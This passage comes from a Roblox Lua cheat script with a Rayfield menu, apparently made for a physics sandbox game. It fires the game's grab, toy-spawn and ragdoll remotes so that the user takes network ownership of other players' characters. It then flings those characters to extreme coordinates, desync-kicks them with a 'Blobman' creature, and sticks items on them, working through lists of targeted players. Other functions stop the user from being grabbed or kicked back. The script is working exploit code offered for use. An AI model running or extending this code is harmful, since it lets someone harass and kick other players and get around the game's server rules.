        local myChar = plr and plr.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while loopPlayerT2 do
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            --local ownerTag = head:FindFirstChild("PartOwner")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        local targetNames = {
            "NinjaKunai", "NinjaShuriken", "NinjaKatana",
            "ToolCleaver", "ToolDiggingForkRusty",
            "ToolPencil", "ToolPickaxe"
        }

        for _, child in ipairs(workspace:GetChildren()) do
            if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                for _, item in ipairs(child:GetChildren()) do
                    if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                        local sticky = item.StickyPart
                        local weld = sticky:FindFirstChild("StickyWeld")

                        if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                            local targetParts = {
                                character:FindFirstChild("Head"),
                                character:FindFirstChild("Torso"),
                                character:FindFirstChild("Left Arm"),
                                character:FindFirstChild("Left Leg"),
                                character:FindFirstChild("Right Arm"),
                                character:FindFirstChild("Right Leg"),
                                hrp:FindFirstChild("RagdollTouchedHitbox"),
                                hrp:FindFirstChild("FirePlayerPart"),
                            }

                            for _, tPart in ipairs(targetParts) do
                                if tPart and weld.Part1 == tPart then
                                    local basePart = item.PrimaryPart or sticky
                                    if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                        rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)

        hrp.CFrame = CFrame.new(99999999, 99999999, 99999999)

        task.spawn(function()
            while loopPlayerT2 do
                if hrp and hrp.Parent and hrp.Position.Y < 99999 then
                    local innerTP = true
                    task.spawn(function()
                        while innerTP do
                            local ok, cf = TP(player)
                            if ok and cf then
                                CF = cf
                            end
                            task.wait()
                        end
                    end)

                    while loopPlayerT2 do
                        rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                        local ownerTag = head:FindFirstChild("PartOwner")
                        if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                            break
                        end
                        task.wait()
                    end

                    innerTP = false
                    rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
                    hrp.CFrame = CFrame.new(99999999, 99999999, 99999999)
                end
                task.wait()
            end
        end)

        if originCF then
            BACK(originCF)
        end

        return true
    end

    task.spawn(function()
        while loopPlayerT2 do
            for _, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)
                if player and not table.find(Whitelist, player.Name) then
                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                    if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                    if humanoid and humanoid.Health > 0 then
                        if processedHumanoids[player] ~= humanoid then
                            local success = processPlayer(player)
                            if success then
                                processedHumanoids[player] = humanoid
                            end
                        end
                    else
                        processedHumanoids[player] = nil
                    end
                    task.wait(0.05)
                end
            end
            task.wait(0.05)
        end
    end)
end

function loopPlayerF3() -- 룹3
    UpdateCurrentBlobman()

    local currentProcessing = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local myChar = plr and plr.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while loopPlayerT3 do
            if not player or not player.Character or not player.Character:FindFirstChild("Head") then break end

            local ownerTag = head:FindFirstChild("FAKE")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        if originCF then BACK(originCF) end
        return true
    end

    task.spawn(function()
        while loopPlayerT3 do
            for _, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)

                if player and not table.find(Whitelist, player.Name) then
                    if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health > 0 then
                        if not currentProcessing[player] then
                            currentProcessing[player] = true

                            task.spawn(function()
                                local success = processPlayer(player)

                                if success then
                                    task.wait(2)
                                end

                                currentProcessing[player] = nil
                            end)
                        end
                    else
                        currentProcessing[player] = nil
                    end
                else
                    if player then
                        currentProcessing[player] = nil
                    end
                end
            end
            task.wait(0.0005)
        end
    end)
end
 function executeBlobmanDesyncKick()
    local targetPlayers = {}
    local lastRemoteTime = 0

    local function fetchTargets()
        local list = {}
        if playersInLoop1V then for _, v in pairs(playersInLoop1V) do table.insert(list, v) end end
        if playersInLoop2V then for _, v in pairs(playersInLoop2V) do table.insert(list, v) end end
        return list
    end

    local function verifyAndGetBlobman()
        if not currentBlobS or not currentBlobS.Parent or not currentBlobS:FindFirstChild("PrimaryPart") then
            UpdateCurrentBlobman()
        end
        return currentBlobS
    end

    local function isolatePhysics(targetChar)
        if not targetChar then return end
        local hrp = targetChar:FindFirstChild("HumanoidRootPart")
        local torso = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso")
        if hrp and torso then
            local rootJoint = hrp:FindFirstChild("RootJoint") or torso:FindFirstChild("RootJoint")
            if rootJoint and rootJoint:IsA("Motor6D") then
                rootJoint.Enabled = false
            end
            hrp.AssemblyLinearVelocity = Vector3.new(0, 9999, 0)
            hrp.AssemblyAngularVelocity = Vector3.new(0, 9999, 0)
        end
    end

    local function restorePhysics(targetChar)
        if not targetChar then return end
        local hrp = targetChar:FindFirstChild("HumanoidRootPart")
        local torso = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso")
        if hrp then
            local rootJoint = hrp:FindFirstChild("RootJoint") or (torso and torso:FindFirstChild("RootJoint"))
            if rootJoint and rootJoint:IsA("Motor6D") then
                rootJoint.Enabled = true
            end
        end
    end

    local masterConnection
    masterConnection = RunService.Heartbeat:Connect(function()
        if not advancedDesyncLoopActive then
            if masterConnection then masterConnection:Disconnect() end
            for p in pairs(targetPlayers) do
                if p.Character then restorePhysics(p.Character) end
            end
            targetPlayers = {}
            return
        end

        local currentNames = fetchTargets()
        local myChar = plr.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local myHum = myChar and myChar:FindFirstChild("Humanoid")
        local mySeat = myChar and myChar:FindFirstChildOfClass("Humanoid") and myChar:FindFirstChildOfClass("Humanoid").SeatPart
        local isRidingBlob = mySeat and mySeat.Parent and mySeat.Parent.Name == "CreatureBlobman"
        local activeBlob = isRidingBlob and verifyAndGetBlobman()
        local now = os.clock()

        if not myHRP or not myHum or myHum.Health <= 0 then return end

        for _, name in ipairs(currentNames) do
            local p = game.Players:FindFirstChild(name)
            if p and p ~= plr and not PPs:FindFirstChild(name) and not inv:FindFirstChild(name) then
                if not targetPlayers[p] then
                    targetPlayers[p] = { lastChar = nil }
                end
            end
        end

        for p, data in pairs(targetPlayers) do
            if not p.Parent or not table.find(currentNames, p.Name) then
                if p.Character then restorePhysics(p.Character) end
                targetPlayers[p] = nil
                continue
            end

            local char = p.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local head = char and char:FindFirstChild("Head")

            if data.lastChar ~= char then
                data.lastChar = char
            end

            if hrp and head and hum and hum.Health > 0 then
                local distance = (myHRP.Position - hrp.Position).Magnitude

                if distance > 30 then
                    hrp.CFrame = myHRP.CFrame * CFrame.new(0, 15, 0)
                else
                    hrp.CFrame = myHRP.CFrame * CFrame.new(0, 15, 0)
                end

                hrp.Velocity = Vector3.new(0, 0, 0)
                hrp.RotVelocity = Vector3.new(0, 0, 0)

                isolatePhysics(char)

                if now - lastRemoteTime >= 0.05 then
                    rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                    rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                    rs.GrabEvents.DestroyGrabLine:FireServer(hrp)
                    
                    if activeBlob then
                        BlobGrab(activeBlob, hrp, "Right")
                        BlobRelease(activeBlob, hrp, "Right")
                    end
                    lastRemoteTime = now
                end
            else
                if char then restorePhysics(char) end
            end
        end
    end)
end




local RunService = game:GetService("RunService")
local notifyCooldowns = {}
local AntiBlobConnection = nil

function AntiBlobF()
    if AntiBlobConnection then 
        AntiBlobConnection:Disconnect() 
        AntiBlobConnection = nil
    end

    AntiBlobConnection = RunService.Stepped:Connect(function()
        if not AntiBlobT then 
            if AntiBlobConnection then 
                AntiBlobConnection:Disconnect() 
                AntiBlobConnection = nil
            end
            return 
        end

        local myChar = plr.Character
        if not myChar then return end
        local humanoid = myChar:FindFirstChild("Humanoid")
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")

        local myAttach = myHRP and myHRP:FindFirstChild("RootAttachment")

        if not (myHRP and myAttach) then 
            return
        end

        if inv then
            for _, blob in ipairs(inv:GetChildren()) do
                if blob.Name == "CreatureBlobman" then
                    local occupantName = "{me}"
                    local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                    if vehicleSeat and vehicleSeat.Occupant then
                        local character = vehicleSeat.Occupant.Parent
                        if character then
                            local player = game.Players:GetPlayerFromCharacter(character)
                            if player then
                                occupantName = player.Name
                            end
                        end
                    end
                    CheckBlob(blob, myHRP, myAttach, occupantName)
                end
            end
        end

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= plr then
                local invs = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if invs then
                    for _, blob in ipairs(invs:GetChildren()) do
                        if blob.Name == "CreatureBlobman" then
                            local occupantName = player.Name
                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local occupantPlayer = game.Players:GetPlayerFromCharacter(character)
                                    if occupantPlayer then
                                        occupantName = occupantPlayer.Name
                                    end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, occupantName)
                        end
                    end
                end
            end
        end

        local plots = workspace:FindFirstChild("PlotItems")
        if plots then
            for i = 1, 5 do
                local plot = plots:FindFirstChild("Plot" .. i)
                if plot then
                    for _, blob in ipairs(plot:GetChildren()) do
                        if blob.Name == "CreatureBlobman" then
                            local occupantName = "Plot " .. i
                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local player = game.Players:GetPlayerFromCharacter(character)
                                    if player then
                                        occupantName = player.Name
                                    end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, occupantName)
                        end
                    end
                end
            end
        end
    end)
end

function CheckBlob(blob, myHRP, myAttach, source)
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not script then return end

    for _, side in ipairs({"Left", "Right"}) do
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then continue end

        local weld = detector:FindFirstChild(side .. "Weld")
        local align = detector:FindFirstChild(side .. "AlignOrientation")

        if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
            local msg = source .. " → " .. side .. " Grab"
            local now = tick()

            if not notifyCooldowns[msg] or (now - notifyCooldowns[msg]) >= 2 then
                notifyCooldowns[msg] = now
                Rayfield:Notify({Title = "[ ✊ ]", Content = msg, Duration = 3, Image = 0})
            end

            local success, errorMsg = pcall(function()
                rs.CharacterEvents.RagdollRemote:FireServer(myHRP, 0)

                local myChar = plr.Character
                if not myChar then return end

                local myHD = myChar:FindFirstChild("Head")
                local myLA = myChar:FindFirstChild("Left Arm")
                local myRA = myChar:FindFirstChild("Right Arm")
                local myLL = myChar:FindFirstChild("Left Leg")
                local myLR = myChar:FindFirstChild("Right Leg")

                if humanoid then
                    humanoid.PlatformStand = true
                end

                local bodyParts = {}

                if myHRP then table.insert(bodyParts, myHRP) end
                if myHD then table.insert(bodyParts, myHD) end
                if myLA then table.insert(bodyParts, myLA) end
                if myRA then table.insert(bodyParts, myRA) end
                if myLL then table.insert(bodyParts, myLL) end
                if myLR then table.insert(bodyParts, myLR) end

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end

                align.Attachment0 = nil
                weld.Attachment0 = nil
                weld.Enabled = false
                align.Enabled = false

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end

                weld.Enabled = true
                align.Enabled = true

                if humanoid then
                    humanoid.PlatformStand = false
                end

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end)

            if not success then
                warn("CheckBlob: " .. errorMsg)
            end
        end
    end
end

function AntiStickyGBF()
    if not AntiStickyGBT then
        return
    end

    while AntiStickyGBT do
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then 
            task.wait(0.1)
            continue
        end

        local desk = inv:FindFirstChild("WD")

        if not desk then
            local spawnRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
            if spawnRemote then
                local offset = hrp.CFrame.LookVector * -24
                local spawnCF = hrp.CFrame + Vector3.new(0, 0, 0) + offset
                task.spawn(function()
                    pcall(function()
                        spawnRemote:InvokeServer("SprayCanWD", spawnCF, spawnCF.Position)
                    end)
                end)
                task.wait(0.00001)

                for _, item in pairs(inv:GetChildren()) do
                    if item.Name == "SprayCanWD" then
                        item.Name = "WD"
                        desk = item
                        break
                    end
                end
            end

            if not desk then
                task.wait(0.01)
                continue
            end
        end

        local main = desk:FindFirstChild("Main")
        if main then
            local bp = main:FindFirstChildOfClass("BodyPosition")
            if not bp then
                bp = Instance.new("BodyPosition")
                bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bp.Position = Vector3.new(hrp.CFrame.X, 600, hrp.CFrame.Z)
                bp.Parent = main
            else
                bp.Position = Vector3.new(hrp.CFrame.X, 600, hrp.CFrame.Z)
            end
        end

        local hitbox = desk:FindFirstChild("Hitbox")
        if not hitbox then
            task.wait(0.1)
            continue
        end

        local partOwner = hitbox:FindFirstChild("PartOwner")
        if not partOwner or partOwner.Value ~= plr.Name then
            rs.GrabEvents.SetNetworkOwner:FireServer(hitbox, hitbox.CFrame)
            task.wait(0.01)
            partOwner = hitbox:FindFirstChild("PartOwner")
            if not partOwner or partOwner.Value ~= plr.Name then
                task.wait(0.1)
                continue
            end
        end

        local hitbox2 = desk:FindFirstChild("StickyRemoverPart")
        if not hitbox2 then
            task.wait(0.01)
            continue
        end

        local validRoots = {}
        for _, name in ipairs(playersInLoop1V) do
            local player = game.Players:FindFirstChild(name)
            if player and player.Character then
                local root = player.Character:FindFirstChild("HumanoidRootPart") 
                if root and not playersInPlotsFolder:FindFirstChild(name) then
                    table.insert(validRoots, root)
                end
            end
        end

        if #validRoots > 0 then
            for _, targetRoot in ipairs(validRoots) do
                if targetRoot then
                    local behindCFrame = targetRoot.CFrame * CFrame.new(1,0,3)
                    hitbox2.CFrame = behindCFrame
                    task.wait()
                end
            end
        end

        task.wait(0.05)
    end
end

function RagdollGrabF()
    if not RagdollGrabT then
        local deskToRemove = inv:FindFirstChild("RB")
        if deskToRemove then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(deskToRemove)
            end
        end
        return
    end

    while RagdollGrabT and task.wait() do
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then
            continue
        end

        local desk = inv:FindFirstChild("RB")

        if not desk then
            local spawnRemote = rs.MenuToys.SpawnToyRemoteFunction
            if spawnRemote then
                local offset = hrp.CFrame.LookVector * -24
                local spawnCF = hrp.CFrame + offset

                task.spawn(function()
                    pcall(function()
                        spawnRemote:InvokeServer("PalletLightBrown", spawnCF, spawnCF.Position)
task.wait(0.1)
                    end)

                    for attempt = 3, 3 do
                        for _, item in pairs(inv:GetChildren()) do
                            if item.Name == "PalletLightBrown" then
                                local soundPart = item:FindFirstChild("SoundPart")
                                if soundPart then
                                    for i = 3, 3 do
                                        pcall(function()
                                            rs.GrabEvents.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                                            rs.GrabEvents.SetNetworkOwner:FireServer(soundPart, hrp.CFrame)
                                        end)
                                    end

                                    local partOwner = soundPart:FindFirstChild("PartOwner")
                                    if partOwner and partOwner.Value == plr.Name then
                                        item.Name = "RB"
                                        return
                                    end
                                end
                            end
                        end
                        task.wait()
                    end
                end)

                task.wait()
                desk = inv:FindFirstChild("RB")
            end
        end

        if not desk then 
            continue 
        end

        pcall(function()
            for _, part in ipairs(desk:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)

        local soundPart = desk:FindFirstChild("SoundPart")
        if not soundPart then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(desk)
            end
            continue
        end

        local partOwner = soundPart:FindFirstChild("PartOwner")
        if not partOwner or partOwner.Value ~= plr.Name then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(desk)
            end
            continue
        end

        local targetFound = false

        for _, other in pairs(game:GetService("Players"):GetPlayers()) do
            if other ~= plr and other.Character and other.Character:FindFirstChild("Head") then
                local head = other.Character.Head
                local headPartOwner = head:FindFirstChild("PartOwner")
                local FreeKick = head:FindFirstChild("OwnerKickRagdoll")

                if (headPartOwner and headPartOwner:IsA("StringValue") and headPartOwner.Value == plr.Name) or 
                   (FreeKick and FreeKick:IsA("StringValue")) then

                    local humanoid = other.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local ragdolled = humanoid:FindFirstChild("Ragdolled")
                        if ragdolled and ragdolled:IsA("BoolValue") and ragdolled.Value then
                            continue
                        end
                    end

                    local otherHrp = other.Character:FindFirstChild("HumanoidRootPart")
                    if otherHrp then
                        soundPart.CFrame = CFrame.new(0,9999,0)
                        task.wait(0.01)
                        soundPart.CFrame = otherHrp.CFrame * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0))
                        targetFound = true
                        break
                    end
                end
            end
        end

        local main = desk:FindFirstChild("Main")
        if main then
            local bp = main:FindFirstChildOfClass("BodyPosition")
            if not bp then
                bp = Instance.new("BodyPosition")
                bp.MaxForce = Vector3.new(999999, 999999, 999999)
                bp.P = 500000
                bp.D = 5000
                bp.Parent = main
            end

            if not targetFound then
                local highPosition = Vector3.new(0, 9999, 0)
                bp.Position = highPosition
                soundPart.CFrame = CFrame.new(highPosition)
            else
                bp.Position = soundPart.Position
            end
        end
    end

    if not RagdollGrabT then
        local deskToRemove = inv:FindFirstChild("RB")
        if deskToRemove then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(deskToRemove)
            end
        end
    end
end

function AntiGrabStickyF()
    local plr = game.Players.LocalPlayer
    
    while AntiGrabStickyT and plr do
        task.wait(0.1)

        local char = plr.Character
        if not char or not char.Parent then
            continue
        end

        local inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
        local rs = game:GetService("ReplicatedStorage")
        local StickyPartEvent = rs.PlayerEvents.StickyPartEvent
        local SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
        local SpawnToyRemoteFunction = rs.MenuToys.SpawnToyRemoteFunction 
        local DestroyToy = rs.MenuToys.DestroyToy

        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        local head = char:FindFirstChild("Head")
        if not hrp or not hum or not head then
            continue
        end

        local agFolder = inv:FindFirstChild("AG")
        local stickyPart = agFolder and agFolder:FindFirstChild("StickyPart")

        local headPartOwner = head:FindFirstChild("PartOwner")
        local stickyWeld = stickyPart and stickyPart:FindFirstChild("StickyWeld")
        local targetPart = hrp:FindFirstChild("RagdollTouchedHitbox")

        if headPartOwner and stickyWeld and targetPart and stickyWeld.Part1 == targetPart then
            pcall(function()
                SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            end)

            if hum.Sit then
                hum.Sit = false
            end
            if not hum.AutoRotate then
                hum.AutoRotate = true
            end

            headPartOwner:Destroy()
        end

        if stickyWeld and targetPart and stickyWeld.Part1 ~= targetPart then
            pcall(function()
                SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            end)
        end

        if stickyPart then
            local distance = (hrp.Position - stickyPart.Position).Magnitude
            if distance > 25 then
                pcall(function()
                    DestroyToy:FireServer(agFolder)
                end)
                task.wait(0.00001)
            else
                local partOwner = stickyPart:FindFirstChild("PartOwner")
                if not partOwner or partOwner.Value ~= plr.Name then
                    pcall(function()
                        SetNetworkOwner:FireServer(stickyPart, hrp.CFrame)
                    end)
                end

                local targetPart = hrp:FindFirstChild("RagdollTouchedHitbox")
                local stickyWeld = stickyPart:FindFirstChild("StickyWeld")

                if targetPart and stickyPart then
                    if not stickyWeld or stickyWeld.Part1 ~= targetPart then
                        pcall(function()
                            StickyPartEvent:FireServer(stickyPart, targetPart, CFrame.new(0, -0.3, 0.3) * CFrame.Angles(190, 0, 0))
                        end)
                    end
                end
            end
        else
            local existingNinja = inv:FindFirstChild("AG")
            if not existingNinja then

                task.spawn(function()
                    pcall(function()
                        SpawnToyRemoteFunction:InvokeServer("NinjaShuriken", hrp.CFrame * CFrame.new(0,10,20), Vector3.new(0,0,0))
                    end)
                end)

                task.wait(0.00001)

                local newNinjaFolder = inv:FindFirstChild("NinjaShuriken")
                if newNinjaFolder then
                    local newStickyPart = newNinjaFolder:FindFirstChild("StickyPart")
                    if newStickyPart then
                        local distance = (hrp.Position - newStickyPart.Position).Magnitude
                        if distance <= 30 then
                            newNinjaFolder.Name = "AG"
                        else
                            pcall(function()
                                DestroyToy:FireServer(newNinjaFolder)
                            end)
                        end
                    end
                end
            else
                local newStickyPart = existingNinja:FindFirstChild("StickyPart")
                if newStickyPart then
                    local distance = (hrp.Position - newStickyPart.Position).Magnitude
                    if distance <= 30 then
                        existingNinja.Name = "AG"
                    end
                end
            end
        end
    end
end

RunService = game:GetService("RunService")
isvs = false

function AntiGrabF(enable)
    if antiGrabConn then
        antiGrabConn:Disconnect()
        antiGrabConn = nil
    end

    if not enable then 
        local char = plr.Character
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")

        if hrp and hrp.Anchored then hrp.Anchored = false end
        if hum then
            hum.RequiresNeck = true
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        end
        return 
    end

    local lastHeldState = false
    local sitHoldTimer = 0
    local shouldKeepSit = false
    local wasHeld = false
    local lastRagdollTime = 0
    local ragdollDuration = 0.48

    antiGrabConn = RunService.Heartbeat:Connect(function(deltaTime)
        local char = plr.Character
        if not char then return end

        local hum = char:FindFirstChild("Humanoid")
        isvs = hum and hum.SeatPart ~= nil

        local isHeld = plr:FindFirstChild("IsHeld")
        if not isHeld then return end

        local head = char:FindFirstChild("Head")
        local POR = head and head:FindFirstChild("PartOwner")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hrp2 = char:FindFirstChild("Torso")
        if not hum then return end

        local FPDH = workspace.FallenPartsDestroyHeight
        local DY = (FPDH <= -50000 and -49999) or (FPDH <= -100 and -99) or -100
        local now = tick()

        if hum then
            hum.RequiresNeck = false
            hum.AutoRotate = true
        end

        if isvs and POR then
        task.wait(0.0003)
        end

        if POR and POR.Value then
            local attackerName = POR.Value

            if attackerName and WhiteListMode then
                local inWhitelist = false
                for _, whiteName in ipairs(Whitelist) do
                    if whiteName == attackerName then
                        inWhitelist = true
                        break
                    end
                end
                if inWhitelist then 
                    return 
                end
            end
        end

        if isvs then task.wait(0.003) end

        local rag = hum:FindFirstChild("Ragdolled")
        if isHeld.Value == true and rag and rag.Value == true then
            for _, limbName in ipairs({"Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}) do
                local limb = char:FindFirstChild(limbName)
                if limb then
                    local ragdollPart = limb:FindFirstChild("RagdollLimbPart")
                    local ragdollCons = limb:FindFirstChild("BallSocketConstraint")
                    if ragdollCons then ragdollCons.Enabled = false end
                    if ragdollPart then ragdollPart.CanCollide = false end
                end
            end
        end

        if hum.Health <= 0 then
            lastHeldState = false
            shouldKeepSit = false
            sitHoldTimer = 0
            wasHeld = false
            hum.Sit = false
            hum.AutoRotate = true
        end

        if not hrp or hum.Health <= 0 then
        --hum:ChangeState(Enum.HumanoidStateType.Dead)
           --char:BreakJoints()
            --rs.CharacterEvents.Struggle:FireServer()
            --if hrp2 then hrp2.CFrame = CFrame.new(9999, DY, 9999) end
        end

        if isHeld.Value == true then
            if hum.MoveDirection.Magnitude > 0 then
                local moveSpeed = 10
                local moveVector = hum.MoveDirection * deltaTime * moveSpeed

                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)

                moveVector = Vector3.new(moveVector.X, 0, moveVector.Z)
                hrp.CFrame = hrp.CFrame + moveVector
                hrp2.CFrame = hrp2.CFrame + moveVector
            end
        end

        if isHeld.Value ~= lastHeldState then
            if isHeld.Value == true then
                wasHeld = true
                shouldKeepSit = true
                sitHoldTimer = 0.3
                hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
                hum.Sit = true
                hum.AutoRotate = true

                lastRagdollTime = now
                if POR and hrp then
                    rs.CharacterEvents.Struggle:FireServer()
                    rs.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
                end

                if hrp then
                    setRagdollF(true)
                end
            else
                if wasHeld then
                    shouldKeepSit = true
                    sitHoldTimer = 0.3
                end
            end
            lastHeldState = isHeld.Value
        end

        if lastRagdollTime > 0 and now - lastRagdollTime >= ragdollDuration then
            setRagdollF(false)
            lastRagdollTime = 0
        end

        if isHeld.Value == true and lastRagdollTime > 0 and now - lastRagdollTime < ragdollDuration then
            if hrp then 
                setRagdollF(true)
            end
        end

        if sitHoldTimer > 0 then
            sitHoldTimer = sitHoldTimer - deltaTime

            if isHeld.Value == true or POR or (rag and rag.Value == true) then
                shouldKeepSit = true
                sitHoldTimer = 0.3
                hum.Sit = true
                if isHeld.Value == true then
                    hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
                end
            else
                hum.Sit = true
            end
        end

        if sitHoldTimer <= 0 and shouldKeepSit then
            local currentRagdolled = hum:FindFirstChild("Ragdolled")
            if not currentRagdolled or currentRagdolled.Value == false then
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.Running)
                shouldKeepSit = false
                wasHeld = false
            else
                sitHoldTimer = 0.3
            end
        end

        if shouldKeepSit then
            hum.Sit = true
        end

        if POR then
            local attackerName = POR.Value

            if attackerName and WhiteListMode then
                local inWhitelist = false
                for _, whiteName in ipairs(Whitelist) do
                    if whiteName == attackerName then
                        inWhitelist = true
                        break
                    end
                end
                if inWhitelist then 
                    return 
                end
            end

            rs.CharacterEvents.Struggle:FireServer()
            rs.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
            shouldKeepSit = true
            sitHoldTimer = 0.3
            hum.Sit = true
            hum.AutoRotate = true
            lastRagdollTime = now
            if hrp then
                setRagdollF(true)
            end
        end
    end)
end


function antiPaintF(state)
    local function setParts(canTouch)
        local char = plr.Character
        if not char then return end
        local parts = {
            "Head",
            "HumanoidRootPart",
            "Torso",
            "Left Arm",
            "Right Arm",
            "Left Leg",
            "Right Leg"
        }
        for _, partName in ipairs(parts) do
            local part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanTouch = canTouch
            end
        end
    end

    if state == true then
        task.spawn(function()
            while AntiPaintT do
                setParts(false)
                task.wait(0.1)
            end
        end)
    else
        setParts(true)
    end
end

local AntiKickF = function()
    local plr = game.Players.LocalPlayer
    local char = plr.Character
    if not char then return end

    if AntiGrabTP_Active then
        return
    end

    local inv = workspace:WaitForChild(plr.Name .. "SpawnedInToys")
    local rs = game:GetService("ReplicatedStorage")
    local StickyPartEvent = rs.PlayerEvents.StickyPartEvent
    local SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
    local SpawnToyRemoteFunction = rs.MenuToys.SpawnToyRemoteFunction
    local DestroyToy = rs.MenuToys.DestroyToy

    local function findMyPO()
        local myDisplayName = plr.DisplayName
        local myUserName = plr.Name
        local myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)
        
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" then
                for _, child in pairs(obj:GetChildren()) do
                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
                        return obj
                    end
                end
            end
        end
        return nil
    end

    while AntiKickT and char and char.Parent do
        if AntiGrabTP_Active then break end
        task.wait()

        local hrp = char:FindFirstChild("HumanoidRootPart")
        local torso = char:FindFirstChild("Torso")
        if not hrp or not torso then continue end

        local myPO = findMyPO()
